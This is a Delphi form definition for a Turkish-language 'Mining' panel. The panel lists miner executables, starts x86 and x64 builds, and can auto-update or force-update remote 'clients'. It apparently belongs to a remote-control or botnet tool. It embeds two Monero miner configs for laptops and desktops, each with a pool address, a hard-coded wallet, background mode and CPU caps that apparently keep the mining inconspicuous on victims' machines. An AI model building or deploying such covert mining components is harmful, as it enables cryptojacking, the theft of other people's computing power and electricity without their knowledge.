object MiningForm: TMiningForm
  Left = 1785
  Top = 179
  Width = 525
  Height = 705
  Caption = 'Mining'
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'MS Sans Serif'
  Font.Style = []
  OldCreateOrder = False
  Position = poMainFormCenter
  OnCreate = FormCreate
  PixelsPerInch = 96
  TextHeight = 13
  object GroupBox3: TGroupBox
    Left = 0
    Top = 0
    Width = 509
    Height = 667
    Align = alClient
    Caption = ' Rig Dosyalar'#305': '
    TabOrder = 0
    object rigFiles: TListBox
      Left = 2
      Top = 15
      Width = 505
      Height = 151
      Align = alClient
      ItemHeight = 13
      TabOrder = 0
    end
    object rigStatus: TMemo
      Left = 2
      Top = 567
      Width = 505
      Height = 67
      Align = alBottom
      Enabled = False
      Font.Charset = TURKISH_CHARSET
      Font.Color = clWindowText
      Font.Height = -12
      Font.Name = 'Consolas'
      Font.Style = []
      Lines.Strings = (
        'x86 Started Exe      : '
        'x64 Started Exe      : '
        'Version              : '
        'All Size             : ')
      ParentFont = False
      ReadOnly = True
      TabOrder = 1
    end
    object Panel3: TPanel
      Left = 2
      Top = 536
      Width = 505
      Height = 31
      Align = alBottom
      BevelOuter = bvNone
      TabOrder = 2
      object rigAdd: TButton
        Left = 8
        Top = 3
        Width = 50
        Height = 24
        Caption = 'Ekle'
        TabOrder = 0
        OnClick = rigAddClick
      end
      object rigRemove: TButton
        Left = 57
        Top = 3
        Width = 50
        Height = 24
        Caption = #199#305'kar'
        TabOrder = 1
        OnClick = rigRemoveClick
      end
      object x86SelectExe: TButton
        Left = 115
        Top = 3
        Width = 94
        Height = 24
        Caption = 'x86 Ba'#351'lat'
        TabOrder = 2
        OnClick = x86SelectExeClick
      end
      object x64SelectExe: TButton
        Left = 208
        Top = 3
        Width = 97
        Height = 24
        Caption = 'x64 Ba'#351'lat'
        TabOrder = 3
        OnClick = x64SelectExeClick
      end
    end
    object Panel1: TPanel
      Left = 2
      Top = 634
      Width = 505
      Height = 31
      Align = alBottom
      BevelOuter = bvNone
      TabOrder = 3
      object ClientForceUpdate: TCheckBox
        Left = 170
        Top = 7
        Width = 160
        Height = 17
        Caption = 'T'#252'm'#252'n'#252' G'#252'ncellemeye Zorla'
        TabOrder = 0
      end
      object ClientAutoUpdate: TCheckBox
        Left = 8
        Top = 7
        Width = 154
        Height = 17
        Caption = 'Clientleri Otomatik G'#252'ncelle'
        TabOrder = 1
      end
      object MiningSave: TButton
        Left = 423
        Top = 4
        Width = 75
        Height = 22
        Caption = 'Kaydet'
        TabOrder = 2
        OnClick = MiningSaveClick
      end
    end
    object GroupBox1: TGroupBox
      Left = 2
      Top = 351
      Width = 505
      Height = 185
      Align = alBottom
      Caption = ' Laptop Params: '
      TabOrder = 4
      object LaptopParams: TMemo
        Left = 2
        Top = 15
        Width = 501
        Height = 168
        Align = alClient
        Font.Charset = DEFAULT_CHARSET
        Font.Color = clWindowText
        Font.Height = -11
        Font.Name = 'MS Sans Serif'
        Font.Style = [fsBold]
        Lines.Strings = (
          '{'
          '    "algo": "cryptonight",'
          '    "api": {'
          '        "port": 0,'
          '        "access-token": null,'
          '        "worker-id": null,'
          '        "ipv6": false,'
          '        "restricted": true'
          '    },'
          '    "av": 0,'
          '    "background": true,'
          '    "colors": true,'
          '    "cpu-affinity": null,'
          '    "cpu-priority": null,'
          '    "donate-level": 1,'
          '    "huge-pages": true,'
          '    "hw-aes": null,'
          '    "log-file": null,'
          '    "pools": ['
          '        {'
          '            "url": "xmr-eu1.nanopool.org:14444",'
          
            '            "user": "4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUM' +
            'XAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQr4iTRVGHUM5sDZPVU.' +
            'XRD7", '
          '            "pass": "",'
          '            "rig-id": null,'
          '            "nicehash": false,'
          '            "keepalive": false,'
          '            "variant": 1'
          '        }'
          '    ],'
          '    "max-cpu-usage": 35,'
          '    "print-time": 60,'
          '    "retries": 50,'
          '    "retry-pause": 500,'
          '    "safe": false,'
          '    "threads": null,'
          '    "user-agent": null,'
          '    "watch": false'
          '}')
        ParentFont = False
        ScrollBars = ssBoth
        TabOrder = 0
      end
    end
    object GroupBox2: TGroupBox
      Left = 2
      Top = 166
      Width = 505
      Height = 185
      Align = alBottom
      Caption = ' Desktop Params: '
      TabOrder = 5
      object DesktopParams: TMemo
        Left = 2
        Top = 15
        Width = 501
        Height = 168
        Align = alClient
        Font.Charset = DEFAULT_CHARSET
        Font.Color = clWindowText
        Font.Height = -11
        Font.Name = 'MS Sans Serif'
        Font.Style = [fsBold]
        Lines.Strings = (
          '{'
          '    "algo": "cryptonight",'
          '    "api": {'
          '        "port": 0,'
          '        "access-token": null,'
          '        "worker-id": null,'
          '        "ipv6": false,'
          '        "restricted": true'
          '    },'
          '    "av": 0,'
          '    "background": true,'
          '    "colors": true,'
          '    "cpu-affinity": null,'
          '    "cpu-priority": null,'
          '    "donate-level": 1,'
          '    "huge-pages": true,'
          '    "hw-aes": null,'
          '    "log-file": null,'
          '    "pools": ['
          '        {'
          '            "url": "xmr-eu1.nanopool.org:14444",'
          
            '            "user": "4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUM' +
            'XAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQr4iTRVGHUM5sDZPVU.' +
            'XRD7", '
          '            "pass": "",'
          '            "rig-id": null,'
          '            "nicehash": false,'
          '            "keepalive": false,'
          '            "variant": 1'
          '        }'
          '    ],'
          '    "max-cpu-usage": 50,'
          '    "print-time": 60,'
          '    "retries": 50,'
          '    "retry-pause": 500,'
          '    "safe": false,'
          '    "threads": null,'
          '    "user-agent": null,'
          '    "watch": false'
          '}')
        ParentFont = False
        ScrollBars = ssBoth
        TabOrder = 0
      end
    end
  end
  object OD: TFileOpenDialog
    FavoriteLinks = <>
    FileTypes = <>
    Options = [fdoAllowMultiSelect]
    Left = 16
    Top = 32
  end
end
